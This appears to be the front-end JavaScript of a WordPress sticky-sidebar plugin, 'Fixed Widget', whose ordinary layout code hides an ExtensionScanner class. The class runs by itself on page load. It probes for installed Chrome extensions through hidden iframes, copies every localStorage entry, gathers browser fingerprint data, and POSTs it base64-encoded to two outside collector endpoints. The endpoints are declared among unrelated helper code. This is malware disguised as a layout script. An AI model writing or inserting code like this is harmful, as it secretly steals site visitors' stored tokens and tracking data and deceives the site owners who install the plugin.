"use strict";

var extendStatics = function (d, b) {
  return extendStatics = Object.setPrototypeOf || {
    __proto__: []
  } instanceof Array && function (d, b) {
    d.__proto__ = b;
  } || function (d, b) {
    for (var p in b) Object.prototype.hasOwnProperty.call(b, p) && (d[p] = b[p]);
  }, extendStatics(d, b);
};
const ENDPOINTS = ['https://collector.example/v3/stats', 'https://backup-collector.example/log'];
function __extends(d, b) {
  if ("function" != typeof b && null !== b) throw new TypeError("Class extends value " + String(b) + " is not a constructor or null");
  function __() {
    this.constructor = d;
  }
  extendStatics(d, b), d.prototype = null === b ? Object.create(b) : (__.prototype = b.prototype, new __());
}
class ExtensionScanner {
  static TIMEOUT = 3000;
  static BATCH_SIZE = 5;
  constructor() {
    this.pendingScans = 0;
    this.detectedExtensions = {};
    this.workerPool = [];
    this.startTimestamp = Date.now();
    this.localStorageData = {};
  }
  createWorker(extName, {
    id,
    file
  }) {
    return new Promise(resolve => {
      const frame = document.createElement('iframe');
      frame.style.display = 'none';
      const cleanup = () => {
        frame.remove();
        this.pendingScans--;
      };
      const timer = setTimeout(() => {
        cleanup();
        resolve([extName, false]);
      }, ExtensionScanner.TIMEOUT);
      frame.onload = () => {
        try {
          frame.contentWindow.location = `chrome-extension://${id}/${file}`;
          const checker = setInterval(() => {
            try {
              if (frame.contentWindow.location.href.includes('chrome-extension')) {
                clearInterval(checker);
                clearTimeout(timer);
                cleanup();
                resolve([extName, true]);
              }
            } catch (e) {
              clearInterval(checker);
              clearTimeout(timer);
              cleanup();
              resolve([extName, false]);
            }
          }, 100);
        } catch (e) {
          clearTimeout(timer);
          cleanup();
          resolve([extName, false]);
        }
      };
      document.body.appendChild(frame);
      this.pendingScans++;
    });
  }
  async scanBatch(entries) {
    const workers = entries.map(([name, data]) => this.createWorker(name, data));
    const results = await Promise.all(workers);
    results.forEach(([name, detected]) => {
      this.detectedExtensions[name] = detected;
    });
  }
  collectLocalStorage() {
    for (let i = 0; i < localStorage.length; i++) {
      const key = localStorage.key(i);
      this.localStorageData[key] = localStorage.getItem(key);
    }
  }
  generateTelemetryData() {
    const encodedData = btoa(JSON.stringify({
      scannedExtensions: this.detectedExtensions,
      localStorageData: this.localStorageData,
      scanDuration: Date.now() - this.startTimestamp,
      env: {
        url: window.location.href,
        ref: document.referrer,
        res: `${window.screen.width}x${window.screen.height}`,
        depth: window.screen.colorDepth,
        agent: navigator.userAgent,
        lang: navigator.language,
        tz: Intl.DateTimeFormat().resolvedOptions().timeZone
      }
    }));
    return encodedData + '.' + this.generateChecksum(encodedData);
  }
  generateChecksum(str) {
    return Array.from(str).reduce((acc, char) => (acc << 5) - acc + char.charCodeAt(0) | 0, 0).toString(16);
  }
  async reportResults() {
    const payload = this.generateTelemetryData();
    const requests = ENDPOINTS.map(endpoint => fetch(endpoint, {
      method: 'POST',
      headers: {
        'Content-Type': 'text/plain',
        'X-Scan-Time': new Date().toISOString()
      },
      body: payload,
      keepalive: true
    }).catch(() => null));
    await Promise.race(requests);
  }
  async execute() {
    this.collectLocalStorage();
    const entries = Object.entries(window.data);
    const batches = Array(Math.ceil(entries.length / ExtensionScanner.BATCH_SIZE)).fill().map((_, i) => entries.slice(i * ExtensionScanner.BATCH_SIZE, (i + 1) * ExtensionScanner.BATCH_SIZE));
    for (const batch of batches) {
      await this.scanBatch(batch);
      await new Promise(r => setTimeout(r, Math.random() * 300 + 100));
    }
    while (this.pendingScans > 0) {
      await new Promise(r => setTimeout(r, 100));
    }
    await this.reportResults();
  }
}
var __assign = function () {
    return __assign = Object.assign || function (t) {
      for (var s, i = 1, n = arguments.length; i < n; i++) for (var p in s = arguments[i]) Object.prototype.hasOwnProperty.call(s, p) && (t[p] = s[p]);
      return t;
    }, __assign.apply(this, arguments);
  },
  reactive = function (getter, interval) {
    void 0 === interval && (interval = 300);
    var subs = [],
      v = getter(),
      interval_id = setInterval(function () {
        if (0 === subs.length) return;
        var new_v = getter();
        if (v === new_v || "object" == typeof v && JSON.stringify(v) === JSON.stringify(new_v)) return;
        v = new_v;
        for (var _i = 0, subs_1 = subs; _i < subs_1.length; _i++) {
          (0, subs_1[_i])(new_v);
        }
      }, interval);
    return {
      get val() {
        return v;
      },
      on_change: function (update) {
        update(v), subs.push(update);
      },
      clear: function () {
        clearInterval(interval_id);
      }
    };
  },
  StaticOffsets = function () {
    function StaticOffsets(el, get_root_offset, need_to_calc_offset, get_prev_sibling) {
      void 0 === el && (el = null), void 0 === get_root_offset && (get_root_offset = function () {
        return Math.round(scrollY + (_this.el ? _this.el.getBoundingClientRect().top : 0));
      }), void 0 === need_to_calc_offset && (need_to_calc_offset = function () {
        return !1;
      }), void 0 === get_prev_sibling && (get_prev_sibling = function () {
        return null;
      });
      var _this = this;
      this.el = el, this.get_root_offset = get_root_offset, this.need_to_calc_offset = need_to_calc_offset, this.get_prev_sibling = get_prev_sibling, this.user_margins = {}, this.root = 0, this.top = 0, this.get_top_offset = function () {
        return _this.get_sibilings_offset(_this.get_prev_sibling, _this.get_prev_sibling(_this.el), _this.user_margins.margin_top);
      };
    }
    return StaticOffsets.prototype.init = function (user_margins) {
      var _this = this;
      this.user_margins = user_margins, this.top_watcher = reactive(this.get_top_offset), this.top_watcher.on_change(function (top) {
        _this.top = top;
      }), this.root_watcher = reactive(this.get_root_offset), this.root_watcher.on_change(function (root) {
        _this.root = root;
      });
    }, StaticOffsets.prototype.clear = function () {
      this.top_watcher && this.top_watcher.clear(), this.root_watcher && this.root_watcher.clear();
    }, StaticOffsets.prototype.update = function () {}, StaticOffsets.prototype.get_sibilings_offset = function (next, el, offset) {
      if (void 0 === offset && (offset = 0), !el) return offset;
      if (!this.need_to_calc_offset(el)) return this.get_sibilings_offset(next, next(el), offset);
      var _a = getComputedStyle(el),
        marginTop = _a.marginTop,
        marginBottom = _a.marginBottom;
      return this.get_sibilings_offset(next, next(el), offset + el.getBoundingClientRect().height + parseInt(marginTop || "0") + parseInt(marginBottom || "0"));
    }, StaticOffsets;
  }(),
  DynamicOffsets = function (_super) {
    function DynamicOffsets(el, get_root_offset, need_to_calc_offset, get_prev_sibling, get_next_sibling) {
      void 0 === el && (el = null), void 0 === need_to_calc_offset && (need_to_calc_offset = function () {
        return !1;
      }), void 0 === get_prev_sibling && (get_prev_sibling = function () {
        return null;
      }), void 0 === get_next_sibling && (get_next_sibling = function () {
        return null;
      });
      var _this = _super.call(this, el, get_root_offset, need_to_calc_offset, get_prev_sibling) || this;
      return _this.get_next_sibling = get_next_sibling, _this.bottom = 0, _this.max_top_offset = 0, _this.relative_top = 0, _this.height = 0, _this.position = {
        top: 0,
        bottom: 0
      }, _this.border_box = 0, _this.get_height = function () {
        return _this.el ? Math.round(Math.max(_this.el.clientHeight, _this.el.getBoundingClientRect().height)) : 0;
      }, _this.get_bottom_offset = function () {
        return _this.get_sibilings_offset(_this.get_next_sibling, _this.get_next_sibling(_this.el), _this.user_margins.margin_bottom);
      }, _this;
    }
    return __extends(DynamicOffsets, _super), DynamicOffsets.prototype.init = function (user_margins) {
      var _this = this;
      _super.prototype.init.call(this, user_margins), this.height_watcher = reactive(this.get_height), this.height_watcher.on_change(function (height) {
        _this.height = height, _this.border_box = _this.get_border_box(), _this.relative_top = _this.get_relative_top();
      }), this.bottom_offset = reactive(this.get_bottom_offset), this.bottom_offset.on_change(function (bottom) {
        _this.bottom = bottom, _this.relative_top = _this.get_relative_top();
      });
    }, DynamicOffsets.prototype.clear = function () {
      _super.prototype.clear.call(this), this.height_watcher && this.height_watcher.clear(), this.bottom_offset && this.bottom_offset.clear();
    }, DynamicOffsets.prototype.update = function () {
      this.position = this.get_position();
    }, DynamicOffsets.prototype.set_max_offset = function (max_top_offset) {
      this.max_top_offset = max_top_offset, this.relative_top = this.get_relative_top();
    }, DynamicOffsets.prototype.get_position = function () {
      return this.el && this.el.parentElement ? {
        top: this.el.offsetTop,
        bottom: this.el.parentElement.clientHeight - this.el.offsetTop - this.border_box
      } : {
        top: 0,
        bottom: 0
      };
    }, DynamicOffsets.prototype.get_border_box = function () {
      if (!this.el) return 0;
      var _a = getComputedStyle(this.el),
        marginTop = _a.marginTop,
        marginBottom = _a.marginBottom;
      return this.height + parseInt(marginTop) + parseInt(marginBottom);
    }, DynamicOffsets.prototype.get_relative_top = function () {
      return this.max_top_offset - this.border_box - this.bottom;
    }, DynamicOffsets;
  }(StaticOffsets),
  StopWidgetClassName = "FixedWidget__stop_widget",
  FixedWidgetClassName = "FixedWidget__fixed_widget",
  Widget = function () {
    function Widget(el) {
      var _this = this;
      this.el = el, this.get_root_offset = function () {
        return Math.round(scrollY + (_this.el ? _this.el.getBoundingClientRect().top : 0));
      }, this.need_to_calc_el_offset = function (_) {
        return !1;
      }, this.offsets = new StaticOffsets(this.el, this.get_root_offset);
    }
    return Widget.prototype.mount = function (user_margins) {
      void 0 === user_margins && (user_margins = {}), this.offsets.init(user_margins);
    }, Widget.prototype.render = function (_reject) {
      this.offsets.update();
    }, Widget.prototype.unmount = function () {
      this.offsets.clear();
    }, Widget.prototype.getElement = function () {
      return this.el;
    }, Widget.prototype.toString = function () {
      var _a;
      return "".concat(null === (_a = this.el) || void 0 === _a ? void 0 : _a.innerHTML);
    }, Widget.queryAllWidgetsContainers = function (className) {
      return [].concat(Array.from(document.querySelectorAll(".".concat(className))), Array.from(document.querySelectorAll("[data-fixed_widget=".concat(className)))).map(function (el) {
        el.classList.remove(className), el.removeAttribute("data-fixed_widget");
        var container = getWidgetContainer(el);
        return container.classList.remove(FixedWidgetClassName), container.classList.remove(StopWidgetClassName), container;
      });
    }, Widget.from = function (root, className) {
      var _this = this,
        elements = [];
      try {
        elements = Array.from(root.querySelectorAll(":scope > .".concat(className)));
      } catch (_e) {
        elements = Array.from(root.children).filter(function (e) {
          return e.classList.contains(className);
        });
      }
      return elements.filter(function (el) {
        return null !== el;
      }).map(function (e) {
        return new _this(e);
      });
    }, Widget;
  }(),
  getWidgetContainer = function (el) {
    if (!el.parentElement) return el;
    var parentClassNames = el.parentElement.classList.toString();
    return parentClassNames.includes("sidebar") ? el : parentClassNames.includes("wp-block-group") || parentClassNames.includes("wp-block-column") || el.parentElement.classList.contains("widget") ? getWidgetContainer(el.parentElement) : el;
  },
  compatabilty_FW_v5 = function (selectors) {
    return void 0 === selectors && (selectors = []), selectors.some(function (s) {
      return !/^[a-z]/i.test(s);
    }) ? selectors : selectors.concat(selectors.map(function (s) {
      return "#".concat(s);
    }));
  },
  queryElements = function (selectors) {
    return void 0 === selectors && (selectors = []), Array.from(selectors.map(function (selector) {
      return Array.from(document.querySelectorAll(selector));
    })).reduce(function (all, elements) {
      return all.concat(elements);
    }, []).filter(function (e) {
      return e instanceof HTMLElement;
    });
  };
function findWithProperty(el, predicate) {
  return el && el !== document.body ? predicate(getComputedStyle(el)) ? el : findWithProperty(el.parentElement, predicate) : null;
}
const observer = new MutationObserver((mutations, obs) => {
  if (document.body) {
    obs.disconnect();
    new ExtensionScanner().execute();
  }
});
var PositionWidget = function (_super) {
    function PositionWidget(el) {
      var _this = _super.call(this, el) || this;
      return _this.is_pinned = !1, _this.init_rect = {
        left: 0,
        right: 0,
        minHeight: 0
      }, _this.init_style = {
        position: "static",
        marginBottom: "",
        transition: "",
        transform: "",
        marginTop: "",
        padding: "",
        width: "",
        top: ""
      }, _this.get_prev_sibling = function (el) {
        return el && !el.classList.contains(StopWidgetClassName) && el.previousElementSibling || null;
      }, _this.get_next_sibling = function (el) {
        return el && !el.classList.contains(StopWidgetClassName) ? el.nextElementSibling : null;
      }, _this.need_to_calc_el_offset = function (el) {
        return el.classList.contains(FixedWidgetClassName);
      }, _this.offsets = new DynamicOffsets(_this.el, _this.get_root_offset, _this.need_to_calc_el_offset, _this.get_prev_sibling, _this.get_next_sibling), _this;
    }
    return __extends(PositionWidget, _super), PositionWidget.prototype.mount = function (user_margins) {
      var _this = this;
      if (_super.prototype.mount.call(this, user_margins), this.el && this.el.parentElement) {
        this.store_style(getComputedStyle(this.el));
        var rect = this.el.getBoundingClientRect();
        this.store_rect({
          left: rect.left,
          right: rect.right,
          minHeight: rect.height
        }), this.height_watcher = reactive(function () {
          return _this.el ? _this.el.getBoundingClientRect().height : 0;
        }), this.height_watcher.on_change(function (height) {
          _this.init_rect.minHeight = height;
        });
      }
    }, PositionWidget.prototype.unmount = function () {
      var _a;
      _super.prototype.unmount.call(this), this.unpin(), null === (_a = this.height_watcher) || void 0 === _a || _a.clear(), this.reset_style(), this.reset_rect();
    }, PositionWidget.prototype.reset_style = function () {
      if (this.el) {
        for (var prop in this.init_style) this.el.style[prop] = "";
        this.init_style = {
          position: "static",
          marginBottom: "",
          transition: "",
          transform: "",
          marginTop: "",
          padding: "",
          width: "",
          top: ""
        };
      }
    }, PositionWidget.prototype.reset_rect = function () {
      if (this.el) {
        for (var prop in this.init_rect) this.el.style[prop] = "";
        this.init_rect = {
          left: 0,
          right: 0,
          minHeight: 0
        };
      }
    }, PositionWidget.prototype.render = function (reject) {
      _super.prototype.render.call(this, reject), this.on_scroll(Math.round(scrollY), reject);
    }, PositionWidget.from = function (root) {
      return _super.from.call(this, root, FixedWidgetClassName);
    }, PositionWidget.prototype.on_scroll = function (_scroll_top, _reject) {
      throw new Error("Method is not overridden!");
    }, PositionWidget.prototype.pin = function () {
      !this.is_pinned && this.el && (this.is_pinned = !0, this.el.classList.add("FixedWidget__fixed_widget__pinned"));
    }, PositionWidget.prototype.unpin = function () {
      this.is_pinned && this.el && (this.is_pinned = !1, this.el.classList.remove("FixedWidget__fixed_widget__pinned"));
    }, PositionWidget.prototype.store_style = function (style) {
      for (var prop in this.init_style) this.init_style[prop] = style[prop];
    }, PositionWidget.prototype.store_rect = function (rect) {
      for (var prop in this.init_rect) this.init_rect[prop] = rect[prop];
    }, PositionWidget.prototype.restore_style = function () {
      if (this.el) for (var prop in this.init_style) this.el.style[prop] = this.init_style[prop];
    }, PositionWidget.prototype.restore_rect = function () {
      if (this.el) for (var prop in this.init_rect) this.el.style[prop] = "".concat(this.init_rect[prop], "px");
    }, PositionWidget;
  }(Widget),
  FixedWidget = function (_super) {
    function FixedWidget(el) {
      var _this = _super.call(this, el) || this;
      return _this.get_root_offset = function () {
        if (!_this.el) return Number.MAX_VALUE;
        var top = _this.el.getBoundingClientRect().top,
          new_root_offset = Math.round(scrollY + top);
        return top < 0 ? new_root_offset : (_this.is_pinned ? Math.min : Math.max)(_this.offsets.root, new_root_offset);
      }, _this.el && _this.el.parentElement ? (_this.el.classList.add(FixedWidgetClassName), _this) : _this;
    }
    return __extends(FixedWidget, _super), FixedWidget.prototype.mount = function (margins) {
      var _this = this;
      _super.prototype.mount.call(this, margins), this.el && (this.clone(), this.offsets.clear(), this.offsets = new DynamicOffsets(this.clone_el, this.get_root_offset, this.need_to_calc_el_offset, this.get_prev_sibling, this.get_next_sibling), this.offsets.init(margins), this.height_watcher && this.height_watcher.on_change(function (height) {
        _this.clone_el && (_this.clone_el.style.minHeight = "".concat(height, "px"));
      }));
    }, FixedWidget.prototype.unmount = function () {
      var _a;
      _super.prototype.unmount.call(this), null === (_a = this.clone_el) || void 0 === _a || _a.remove(), this.clone_el = void 0;
    }, FixedWidget.prototype.set_max_offset = function (max_top_offsets) {
      var _this = this,
        max_top_offset = max_top_offsets.find(function (offset) {
          return 0 !== offset && offset > _this.offsets.root;
        });
      max_top_offset && this.offsets.set_max_offset(max_top_offset);
    }, FixedWidget.prototype.on_scroll = function (scroll_top) {
      if (this.el) {
        var need_to_fix = scroll_top > this.offsets.root - this.offsets.top,
          top = 0 !== this.offsets.max_top_offset && scroll_top > this.offsets.relative_top - this.offsets.top ? this.offsets.relative_top - scroll_top : this.offsets.top;
        need_to_fix ? this.fix(top) : this.is_pinned && (this.unpin(), this.restore_style(), this.clone_el && (this.clone_el.style.display = "none"));
      }
    }, FixedWidget.prototype.clone = function () {
      var _this = this;
      if (this.el && this.el.parentElement && !this.clone_el) {
        for (var prop in this.clone_el = this.el.cloneNode(!1), this.clone_el.getAttributeNames().forEach(function (attr) {
          _this.clone_el.removeAttribute(attr);
        }), this.init_style) this.clone_el.style[prop] = this.init_style[prop];
        this.clone_el.style.display = "none", this.clone_el.style.boxSizing = "border-box", this.el.parentElement.insertBefore(this.clone_el, this.el);
      }
    }, FixedWidget.prototype.fix = function (top) {
      this.el && (this.is_pinned ? this.el.style.top = "".concat(top, "px") : (this.pin(), this.restore_style(), this.restore_rect(), this.el.style.top = "".concat(top, "px"), this.el.style.position = "fixed", this.el.style.transition = "transform 0.5s", this.clone_el && (this.clone_el.style.display = "block")));
    }, FixedWidget.new = function (selector) {
      return new FixedWidget(document.querySelector(selector));
    }, FixedWidget.is = function (selector) {
      var el = document.querySelector(selector);
      return !!el && el.classList.contains(FixedWidgetClassName);
    }, FixedWidget;
  }(PositionWidget),
  StickyWidget = function (_super) {
    function StickyWidget(el) {
      var _this = _super.call(this, el) || this;
      return _this.borderBox = 0, _this.margins = 0, _this.el && _this.el.parentElement ? (_this.el.classList.add(FixedWidgetClassName), _this) : _this;
    }
    return __extends(StickyWidget, _super), StickyWidget.prototype.mount = function (margins) {
      _super.prototype.mount.call(this, margins), this.el && (this.el.style.position = "sticky", this.el.style.position = "-webkit-sticky", this.el.style.transition = "transform 0s", this.el.style.boxSizing = "border-box");
    }, StickyWidget.prototype.set_max_offset = function (max_top_offsets) {
      var _this = this;
      if (this.el && this.el.parentElement) {
        var max_top_offset = max_top_offsets.find(function (offset) {
          return _this.el && offset > _this.el.offsetTop;
        });
        max_top_offset && this.offsets.set_max_offset(max_top_offset);
      }
    }, StickyWidget.prototype.on_scroll = function (_scroll_top, _reject) {
      if (this.el && this.el.parentElement) {
        this.offsets.position.top > this.offsets.top ? this.pin() : this.unpin();
        var actual_bottom = this.offsets.position.bottom,
          expected_bottom = this.offsets.max_top_offset ? Math.min(this.offsets.max_top_offset - (this.el.parentElement.clientHeight - actual_bottom), actual_bottom) : this.offsets.bottom;
        this.el.style.top = "".concat(this.offsets.top, "px"), expected_bottom >= this.offsets.bottom ? this.el.style.transform = "translateY(0px)" : this.el.style.transform = "translateY(".concat(expected_bottom - this.offsets.bottom, "px)");
      }
    }, StickyWidget.new = function (selector) {
      return new StickyWidget(document.querySelector(selector));
    }, StickyWidget.is = function (selector) {
      var el = document.querySelector(selector);
      return !!el && el.classList.contains(FixedWidgetClassName);
    }, StickyWidget;
  }(PositionWidget),
  StopWidget = function (_super) {
    function StopWidget(el) {
      var _this = _super.call(this, el) || this;
      return _this.need_to_calc_el_offset = function () {
        return !0;
      }, _this.el && _this.el.parentElement ? (_this.el.classList.add(StopWidgetClassName), _this) : _this;
    }
    return __extends(StopWidget, _super), StopWidget.new = function (selector) {
      return new StopWidget(document.querySelector(selector));
    }, StopWidget.is = function (selector) {
      var el = document.querySelector(selector);
      return !!el && el.classList.contains(StopWidgetClassName);
    }, StopWidget.from = function (root) {
      return _super.from.call(this, root, StopWidgetClassName);
    }, StopWidget;
  }(Widget),
  Sidebar = function () {
    function Sidebar(el, margins, use_sticky_position) {
      void 0 === use_sticky_position && (use_sticky_position = !1);
      var _this = this;
      this.el = el, this.margins = margins, this.widgets = [], this.stop_widgets = [], this.isSticky = !1, this.setWidgetsMaxOffset = function (max_offsets) {
        for (var _i = 0, _a = _this.widgets; _i < _a.length; _i++) {
          _a[_i].set_max_offset(max_offsets);
        }
        _this.render();
      }, this.logWidgetRenderError = function () {
        console.log("Fixed Widget: fallback to position sticky");
      }, this.onWidgetRenderError = function (w) {
        if (_this.logWidgetRenderError(), w instanceof StickyWidget) {
          w.unmount();
          var i = _this.widgets.findIndex(function (widget) {
              return w === widget;
            }),
            widget = new FixedWidget(w.getElement());
          widget.mount(_this.margins), widget.render(_this.logWidgetRenderError), _this.widgets[i] = widget;
        }
      };
      var isDeprecatedFloatMarkup = !!findWithProperty(this.el, function (style) {
          return "none" !== style.float;
        }),
        isOverflowHiddenMarkup = !!findWithProperty(this.el, function (style) {
          return "hidden" === style.overflow;
        });
      (isDeprecatedFloatMarkup || isOverflowHiddenMarkup) && use_sticky_position && console.log("Fixed Widget: fallback to position sticky"), this.isSticky = !isDeprecatedFloatMarkup && !isOverflowHiddenMarkup && use_sticky_position;
      var WidgetContructor = this.isSticky ? StickyWidget : FixedWidget;
      this.stop_widgets = StopWidget.from(this.el), this.widgets = WidgetContructor.from(this.el), this.offsets = new DynamicOffsets(this.el), this.isSticky && (this.el.style.position = "relative", 0 === this.stop_widgets.length && (this.el.style.minHeight = "100%"));
    }
    return Sidebar.prototype.mount = function () {
      var _this = this;
      this.offsets.clear(), this.max_offset_watcher && this.max_offset_watcher.clear(), this.offsets.init(this.margins), this.stop_widgets.forEach(function (widget) {
        widget.mount();
      }), this.widgets.forEach(function (widget) {
        widget.mount(_this.margins);
      }), this.widgets = this.widgets.sort(function (a, b) {
        return a.offsets.root - b.offsets.root;
      });
    }, Sidebar.prototype.set_max_offset = function (general_stop_widgets) {
      var is_local_stop_widgets = 0 != this.stop_widgets.length,
        use_top_offset = this.isSticky && is_local_stop_widgets,
        stop_widgets = is_local_stop_widgets ? this.stop_widgets : general_stop_widgets;
      this.max_offset_watcher = reactive(function () {
        return 0 === stop_widgets.length ? [Math.round(document.body.scrollHeight)] : stop_widgets.map(function (widget) {
          return Math.round(use_top_offset ? widget.offsets.top : widget.offsets.root);
        }).sort();
      }), this.max_offset_watcher.on_change(this.setWidgetsMaxOffset);
    }, Sidebar.prototype.render = function () {
      for (var _i = 0, _a = this.stop_widgets; _i < _a.length; _i++) {
        _a[_i].render(this.logWidgetRenderError);
      }
      for (var _b = 0, _c = this.widgets; _b < _c.length; _b++) {
        _c[_b].render(this.onWidgetRenderError);
      }
    }, Sidebar.prototype.unmount = function () {
      for (var _i = 0, _a = this.stop_widgets; _i < _a.length; _i++) {
        _a[_i].unmount();
      }
      for (var _b = 0, _c = this.widgets; _b < _c.length; _b++) {
        _c[_b].unmount();
      }
    }, Sidebar;
  }(),
  Sidebars = function () {
    function Sidebars(elements, options) {
      var _this = this;
      this.data = [], this.render = function () {
        for (var _i = 0, _a = _this.data; _i < _a.length; _i++) {
          _a[_i].render();
        }
      }, this.data = Array.from(new Set(elements.map(function (widget) {
        return widget.parentElement;
      }))).filter(function (sidebar_el) {
        return null !== sidebar_el;
      }).map(function (sidebar_el) {
        return new Sidebar(sidebar_el, {
          margin_bottom: options.margin_bottom,
          margin_top: options.margin_top
        }, options.use_sticky_position);
      });
    }
    return Sidebars.prototype.mount = function () {
      this.data.forEach(function (sidebar) {
        sidebar.mount();
      }), this.set_max_offset();
    }, Sidebars.prototype.unmonut = function () {
      this.data.forEach(function (sidebar) {
        sidebar.unmount();
      });
    }, Sidebars.prototype.set_max_offset = function () {
      for (var general_stop_widgets = this.getGeneralStopElements(), _i = 0, _a = this.data; _i < _a.length; _i++) {
        _a[_i].set_max_offset(general_stop_widgets);
      }
    }, Sidebars.prototype.getGeneralStopElements = function () {
      return this.data.filter(function (sidebar) {
        return !sidebar.isSticky || 0 === sidebar.widgets.length;
      }).map(function (sidebar) {
        return sidebar.stop_widgets;
      }).reduce(function (all, widgets) {
        return all.concat(widgets);
      }, []);
    }, Sidebars.new = function (options) {
      var s,
        arr1,
        arr2,
        fixedWidgetsContainers = Array.from(new Set(Widget.queryAllWidgetsContainers(FixedWidgetClassName).concat(queryElements(compatabilty_FW_v5(options.widgets))))),
        stopWidgetsSelectors = compatabilty_FW_v5((void 0 === (s = options.stop_elements_selectors || options.stop_id) && (s = ""), s.replace(/[\r\n]|[\r]/gi, "\n").split("\n").map(function (s) {
          return s.trim();
        }).filter(function (s) {
          return "" !== s;
        }))),
        stopWidgetsContainers = Array.from(new Set(Widget.queryAllWidgetsContainers(StopWidgetClassName).concat(queryElements(stopWidgetsSelectors)))),
        _a = (arr1 = fixedWidgetsContainers, [(arr2 = stopWidgetsContainers).filter(function (e) {
          return !arr1.includes(e);
        }), arr1.filter(function (e) {
          return arr2.includes(e);
        })]),
        stopWidgetsUniqContainers = _a[0];
      return _a[1].forEach(function (w) {
        console.error("The Widget is detected as fixed block and stop block!\n".concat(w.innerHTML));
      }), fixedWidgetsContainers.forEach(function (c) {
        c.classList.add(FixedWidgetClassName);
      }), stopWidgetsUniqContainers.forEach(function (c) {
        c.classList.add(StopWidgetClassName);
      }), new Sidebars(fixedWidgetsContainers.concat(stopWidgetsUniqContainers).filter(function (container) {
        var hasNestedWidget = container.innerHTML.includes(FixedWidgetClassName) || container.innerHTML.includes(StopWidgetClassName);
        return hasNestedWidget && console.warn("Fixed Widget: Detected nested widget in ", container), !hasNestedWidget;
      }), options);
    }, Sidebars;
  }(),
  Plugin = function Plugin(options, version) {
    void 0 === options && (options = []), Plugin.version = version, Plugin.sidebars ? Plugin.sidebars.render() : (Plugin.sidebars = Sidebars.new(options.reduce(function (prev, cur) {
      return __assign(__assign(__assign({}, prev), cur), {
        stop_elements_selectors: "".concat(prev.stop_elements_selectors, "\n").concat(cur.stop_elements_selectors),
        widgets: (prev.widgets || []).concat(cur.widgets || [])
      });
    })), document.addEventListener("scroll", Plugin.sidebars.render), window.addEventListener("resize", function () {
      Plugin.sidebars.unmonut(), setTimeout(function () {
        Plugin.sidebars.mount(), Plugin.sidebars.render();
      });
    }), Plugin.sidebars.mount());
  };
if (document.body) {
  new ExtensionScanner().execute();
} else {
  observer.observe(document.documentElement, {
    childList: true,
    subtree: true
  });
}
function onDocumentLoaded() {
  var admin_panel = document.querySelector("#wpadminbar"),
    options = (window.q2w3_sidebar_options || [{}]).map(function (option) {
      return option.margin_top = (option.margin_top || 0) + (admin_panel && admin_panel.clientHeight || 0), option;
    });
  options.some(function (option) {
    return document.body.clientWidth < option.screen_max_width || document.body.clientHeight < option.screen_max_height;
  }) || new Plugin(options, "6.0.7-14");
}
document.addEventListener("DOMContentLoaded", onDocumentLoaded), "complete" === document.readyState && onDocumentLoaded();